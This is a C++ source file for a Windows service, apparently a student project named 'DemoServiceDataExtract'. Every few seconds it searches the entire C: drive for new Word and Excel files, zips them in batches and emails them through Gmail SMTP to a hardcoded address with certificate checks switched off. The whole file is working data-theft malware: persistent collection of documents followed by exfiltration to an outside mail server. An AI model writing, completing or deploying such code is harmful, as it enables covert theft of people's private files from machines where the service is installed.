#include <Windows.h>
#include <iostream>
#include <string>
#include <vector>
#include <algorithm>
#include <zip.h>
#include <shlwapi.h>
#include <filesystem>
#include <curl/curl.h>
#include <atomic>
#include <thread>
#include <wincrypt.h>
#include <fstream>
using namespace std;
namespace fs = std::filesystem;

// ====== Cấu trúc & biến global ======
static vector<wstring> file_path;
static vector<wstring> file_name;
vector<string> file_hashes;

SERVICE_STATUS        gStatus{};
SERVICE_STATUS_HANDLE gStatusHandle = nullptr;
HANDLE                g_StopEvent   = NULL;
int batch = 1;
// ====== KHAI BÁO HÀM TRƯỚC ======
ULONGLONG FileTimeToULL(const FILETIME& ft);
bool IsSameDayToday(const FILETIME& ftWrite);
string wstring_to_utf8(const wstring& w);
bool ends_with(const wstring& s, const wstring& suffix);
bool HasTargetExtension(const wstring& name);
bool add_file(zip_t* archive, const wstring& wfilepath, const wstring& wname);
void FindFile(const wstring& directory);
void compress_to_disk();


void WINAPI ServiceMain(DWORD argc, LPSTR* argv);
void WINAPI ServiceCtrlHandler(DWORD ctrl);
void ReportStatus(DWORD state, DWORD win32ExitCode = NO_ERROR, DWORD waitHint = 0);
void Worker();   // thread worker


string bytes_to_hex(const BYTE* data, DWORD len)
{
    static const char* hex = "0123456789abcdef";
    std::string out;
    out.reserve(len * 2);

    for (DWORD i = 0; i < len; ++i)
    {
        out.push_back(hex[data[i] >> 4]);
        out.push_back(hex[data[i] & 0x0F]);
    }
    return out;
}

string sha256_file(const std::wstring& path)
{
    HCRYPTPROV hProv = 0;
    HCRYPTHASH hHash = 0;

    HANDLE hFile = CreateFileW(path.c_str(),
                               GENERIC_READ,
                               FILE_SHARE_READ,
                               NULL,
                               OPEN_EXISTING,
                               FILE_ATTRIBUTE_NORMAL,
                               NULL);

    if (hFile == INVALID_HANDLE_VALUE)
        return {};

    if (!CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT))
    {
        CloseHandle(hFile);
        return {};
    }

    if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash))
    {
        CloseHandle(hFile);
        CryptReleaseContext(hProv, 0);
        return {};
    }

    BYTE buffer[4096];
    DWORD bytesRead = 0;

    while (ReadFile(hFile, buffer, sizeof(buffer), &bytesRead, NULL) && bytesRead)
    {
        CryptHashData(hHash, buffer, bytesRead, 0);
    }

    BYTE hash[32];
    DWORD hashLen = 32;
    CryptGetHashParam(hHash, HP_HASHVAL, hash, &hashLen, 0);

    CloseHandle(hFile);
    CryptDestroyHash(hHash);
    CryptReleaseContext(hProv, 0);

    return bytes_to_hex(hash, hashLen);
}

void save_hashes_to_file(const std::vector<std::string>& hashes)
{
    std::ofstream out("C:\\ProgramData\\MyZipOutput\\hashes.txt", std::ios::trunc);

    for (const auto& h : hashes)
        out << h << "\n";
}

void load_hashes_from_file(std::vector<std::string>& hashes)
{
    std::ifstream in("C:\\ProgramData\\MyZipOutput\\hashes.txt");
    if (!in.is_open())
        return;

    std::string line;
    while (std::getline(in, line))
    {
        if (!line.empty())
            hashes.push_back(line);
    }
}

// ====== wstring -> UTF-8 ======
string wstring_to_utf8(const wstring& w)
{
    if (w.empty()) return {};
    int size_needed = WideCharToMultiByte(CP_UTF8, 0,
                                          w.data(), (int)w.size(),
                                          nullptr, 0, nullptr, nullptr);
    string result(size_needed, 0);
    WideCharToMultiByte(CP_UTF8, 0,
                        w.data(), (int)w.size(),
                        result.data(), size_needed,
                        nullptr, nullptr);
    return result;
}

// ====== Kiểm tra đuôi file ======
bool ends_with(const wstring& s, const wstring& suffix)
{
    if (s.size() < suffix.size()) return false;
    return equal(suffix.rbegin(), suffix.rend(), s.rbegin());
}

bool HasTargetExtension(const wstring &name)
{
    wstring lower = name;
    transform(lower.begin(), lower.end(), lower.begin(), ::towlower);

    return  ends_with(lower, L".docx") ||
            ends_with(lower, L".xlsx");
}

// ====== Thêm file vào ZIP (đọc file vào RAM rồi add) ======
// bool add_file(zip_t* archive, const wstring& wfilepath, const wstring& wname)
// {
//     // 1) mở file (Unicode)
//     FILE* fp = _wfopen(wfilepath.c_str(), L"rb");
//     if (!fp)
//     {
//         return false;
//     }

//     // 2) lấy size
//     fseek(fp, 0, SEEK_END);
//     long size = ftell(fp);
//     rewind(fp);

//     if (size <= 0)
//     {
//         fclose(fp);
//         return false;
//     }

//     // 3) đọc hết vào buffer
//     vector<char> buffer(size);
//     size_t readBytes = fread(buffer.data(), 1, size, fp);
//     fclose(fp);

//     if (readBytes != (size_t)size)
//     {
//         return false;
//     }

//     // 4) tạo source từ memory
//     zip_source_t* src = zip_source_buffer(archive,
//                                           buffer.data(),
//                                           buffer.size(),
//                                           0); // 0 = không để libzip free buffer
//     if (!src)
//     {
//         return false;
//     }

//     // 5) tên file trong zip (UTF-8)
//     string name_in_zip = wstring_to_utf8(wname);

//     if (zip_file_add(archive, name_in_zip.c_str(), src,
//                      ZIP_FL_ENC_UTF_8 | ZIP_FL_OVERWRITE) < 0)
//     {
        
//         zip_source_free(src);
//         return false;
//     }

//     return true;
// }

bool add_file(zip_t* archive, const wstring& wfilepath, const wstring& wname)
{
    // Chuyển đường dẫn & tên file sang UTF-8 để libzip dùng
    std::string filepath   = wstring_to_utf8(wfilepath);
    std::string name_in_zip = wstring_to_utf8(wname);

    // Tạo source trực tiếp từ file trên đĩa
    zip_source_t* src = zip_source_file(archive, filepath.c_str(), 0, 0);
    if (!src)
    {
        // Có thể log thêm lỗi ở đây nếu muốn
        return false;
    }

    // Thêm file vào archive
    if (zip_file_add(archive,
                     name_in_zip.c_str(),
                     src,
                     ZIP_FL_OVERWRITE | ZIP_FL_ENC_UTF_8) < 0)
    {
        // Nếu add thất bại thì phải free source
        zip_source_free(src);
        return false;
    }

    return true;
}

// ====== Duyệt thư mục, lấy file mới nhất trong hôm nay ======
void FindFile(const wstring &directory)
{
    wstring tmp = directory + L"\\*";
    WIN32_FIND_DATAW file;
    HANDLE search_handle = FindFirstFileW(tmp.c_str(), &file);

    if (search_handle != INVALID_HANDLE_VALUE)
    {
        vector<wstring> directories;

        do
        {
            if (file.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
            {
                if ((!lstrcmpW(file.cFileName, L".")) ||
                    (!lstrcmpW(file.cFileName, L"..")))
                    continue;
            }

            tmp = directory + L"\\" + wstring(file.cFileName);

            if (!(file.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY))
            {
                if (HasTargetExtension(file.cFileName))
                {
                    string h = sha256_file(tmp);
                    bool exists = std::find(file_hashes.begin(), file_hashes.end(), h) != file_hashes.end();
                   if(!exists)
                    {
                        file_path.push_back(tmp);
                        file_name.push_back(file.cFileName);
                        file_hashes.push_back(h);
                        save_hashes_to_file(file_hashes);
                        //wcout << tmp << endl;
                    }
                       
                }
            }
            else
            {
                directories.push_back(tmp);
            }
        }
        while (FindNextFileW(search_handle, &file));

        FindClose(search_handle);

        for (auto &d : directories)
            FindFile(d);
    }
}
// ====== Gửi email với các file .zip trong folder ======
bool sendEmail_one_file(const std::wstring& wpath)
{
    CURL *curl = curl_easy_init();
    if (!curl) return false;

    char errbuf[CURL_ERROR_SIZE];
    memset(errbuf, 0, sizeof(errbuf));

    curl_easy_setopt(curl, CURLOPT_ERRORBUFFER, errbuf);
    curl_easy_setopt(curl, CURLOPT_VERBOSE, 1L);

    curl_easy_setopt(curl, CURLOPT_USERNAME, "n21dcat067@student.ptithcm.edu.vn");
    curl_easy_setopt(curl, CURLOPT_PASSWORD, "app_passwrod");
    curl_easy_setopt(curl, CURLOPT_URL, "smtp://smtp.gmail.com:587");
    curl_easy_setopt(curl, CURLOPT_USE_SSL, (long)CURLUSESSL_ALL);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);

    curl_easy_setopt(curl, CURLOPT_MAIL_FROM, "n21dcat067@student.ptithcm.edu.vn");

    struct curl_slist *recipients = NULL;
    recipients = curl_slist_append(recipients, "n21dcat067@student.ptithcm.edu.vn");
    curl_easy_setopt(curl, CURLOPT_MAIL_RCPT, recipients);

    curl_mime *mime = curl_mime_init(curl);

    // body text
    curl_mimepart *part = curl_mime_addpart(mime);
    curl_mime_data(part, "Attached file.", CURL_ZERO_TERMINATED);

    // ====== file đính kèm ======
    std::string path_utf8 = wstring_to_utf8(wpath);

    curl_mimepart *filepart = curl_mime_addpart(mime);
    curl_mime_filedata(filepart, path_utf8.c_str());
    curl_mime_type(filepart, "application/octet-stream");
    curl_mime_encoder(filepart, "base64");

    // tên file trong email
    std::filesystem::path p(path_utf8);
    curl_mime_filename(filepart, p.filename().string().c_str());

    curl_easy_setopt(curl, CURLOPT_MIMEPOST, mime);

    CURLcode res = curl_easy_perform(curl);
    if (res != CURLE_OK)
    {
        std::ofstream log("C:\\ProgramData\\curl_error.log", std::ios::app);
        log << "curl error: " << errbuf << "\n";
        log.close();

        curl_easy_cleanup(curl);
        return false;
    }
    // curl_mime_free(mime);
    // curl_slist_free_all(recipients);
    // curl_easy_cleanup(curl);

    return res == CURLE_OK;
}

bool is_larger_than_25MB(const std::wstring& path)
{
    WIN32_FILE_ATTRIBUTE_DATA info;

    if (!GetFileAttributesExW(path.c_str(), GetFileExInfoStandard, &info))
        return false;

    ULONGLONG size =
        (static_cast<ULONGLONG>(info.nFileSizeHigh) << 32) |
         info.nFileSizeLow;

    const ULONGLONG LIMIT = 25ull * 1024ull * 1024ull;

    return size > LIMIT;
}

// ====== Nén file đã chọn ra thư mục C:\MyZipOutput ======
void compress_to_disk()
{
    std::wstring output_dir = L"C:\\ProgramData\\MyZipOutput";

    if (!CreateDirectoryW(output_dir.c_str(), NULL))
    {
        if (GetLastError() != ERROR_ALREADY_EXISTS)
        {
            return;
        }
    }

    size_t total = file_path.size();
    if (total == 0)
        return;

    const size_t chunk_size = 2;

    for (size_t i = 0; i < total; i += chunk_size)
    {
        std::wstring zip_full =
            output_dir + L"\\batch_" + std::to_wstring(batch) + L".zip";

        std::string zip_utf8 = wstring_to_utf8(zip_full);

        int err = 0;
        zip_t* archive = zip_open(zip_utf8.c_str(),
                                  ZIP_CREATE | ZIP_TRUNCATE,
                                  &err);
        if (!archive)
            continue;

        for (size_t j = i; j < i + chunk_size && j < total; ++j)
        {
            // bây giờ add_file dùng zip_source_file, an toàn
            add_file(archive, file_path[j], file_name[j]);
        }

        zip_close(archive);
        Sleep(5000);
        if(!is_larger_than_25MB(zip_full))
        {
            if(!sendEmail_one_file(zip_full))
            {
                //DeleteFileW(zip_full.c_str());
                //return;
            }
            
        }
        //DeleteFileW(zip_full.c_str());
        batch++;
    }
}



// ====== Cập nhật trạng thái service cho SCM ======
void ReportStatus(DWORD state, DWORD win32ExitCode, DWORD waitHint)
{
    static DWORD checkPoint = 1;

    gStatus.dwServiceType             = SERVICE_WIN32_OWN_PROCESS;
    gStatus.dwCurrentState            = state;
    gStatus.dwControlsAccepted        = (state == SERVICE_START_PENDING)
                                        ? 0
                                        : SERVICE_ACCEPT_STOP;
    gStatus.dwWin32ExitCode           = win32ExitCode;
    gStatus.dwServiceSpecificExitCode = 0;
    gStatus.dwWaitHint                = waitHint;

    if (state == SERVICE_RUNNING || state == SERVICE_STOPPED)
        gStatus.dwCheckPoint = 0;
    else
        gStatus.dwCheckPoint = checkPoint++;

    if (gStatusHandle)
        SetServiceStatus(gStatusHandle, &gStatus);
}

void ensure_output_dir()
{
    std::wstring output_dir = L"C:\\ProgramData\\MyZipOutput";
    CreateDirectoryW(output_dir.c_str(), NULL);
}
// ====== Worker thread: làm việc định kỳ cho đến khi STOP ======
void Worker()
{
    ensure_output_dir();
    const DWORD INTERVAL_MS = 10 * 1000; // 60 giây/lần – tùy chỉnh
    load_hashes_from_file(file_hashes);
    while (WaitForSingleObject(g_StopEvent, INTERVAL_MS) == WAIT_TIMEOUT)
    {
        file_path.clear();
        file_name.clear();

        // tìm file mới nhất hôm nay
        FindFile(L"C:\\");

        if (file_path.empty())
        {
            continue;
        }

        // nén
        compress_to_disk();
    }
}

// ====== Xử lý lệnh từ Service Control Manager ======
void WINAPI ServiceCtrlHandler(DWORD ctrl)
{
    if (ctrl == SERVICE_CONTROL_STOP)
    {
        ReportStatus(SERVICE_STOP_PENDING, NO_ERROR, 3000);
        if (g_StopEvent)
            SetEvent(g_StopEvent);  // báo cho Worker dừng
    }
}

// ====== Entry của service (do SCM gọi) ======
void WINAPI ServiceMain(DWORD /*argc*/, LPSTR* /*argv*/)
{
    // đăng ký handler
    gStatusHandle = RegisterServiceCtrlHandlerA("DemoServiceDataExtract", ServiceCtrlHandler);
    if (!gStatusHandle)
        return;

    ReportStatus(SERVICE_START_PENDING);

    // init libcurl
    curl_global_init(CURL_GLOBAL_DEFAULT);

    // tạo stop event
    g_StopEvent = CreateEvent(
        NULL,
        TRUE,   // manual reset
        FALSE,  // initial = not signaled
        NULL
    );

    if (!g_StopEvent)
    {
        ReportStatus(SERVICE_STOPPED, GetLastError());
        curl_global_cleanup();
        return;
    }

    // start worker
    std::thread workerThread(Worker);

    // báo service đang RUNNING
    ReportStatus(SERVICE_RUNNING);

    // đợi đến khi có STOP
    WaitForSingleObject(g_StopEvent, INFINITE);

    // đợi thread kết thúc
    if (workerThread.joinable())
        workerThread.join();

    // dọn dẹp
    CloseHandle(g_StopEvent);
    curl_global_cleanup();

    ReportStatus(SERVICE_STOPPED);
}

// ====== Entry point của process ======
int main()
{
    SERVICE_TABLE_ENTRYA table[] = {
        { (LPSTR)"DemoServiceDataExtract", ServiceMain },
        { nullptr, nullptr }
    };

    // Hàm này sẽ block cho đến khi service dừng
    if (!StartServiceCtrlDispatcherA(table))
    {
        // Nếu chạy dưới dạng console bình thường (không phải service)
        // có thể log ra đây để debug
        std::cerr << "StartServiceCtrlDispatcherA failed, error = "
                  << GetLastError() << std::endl;
    }

    return 0;
}
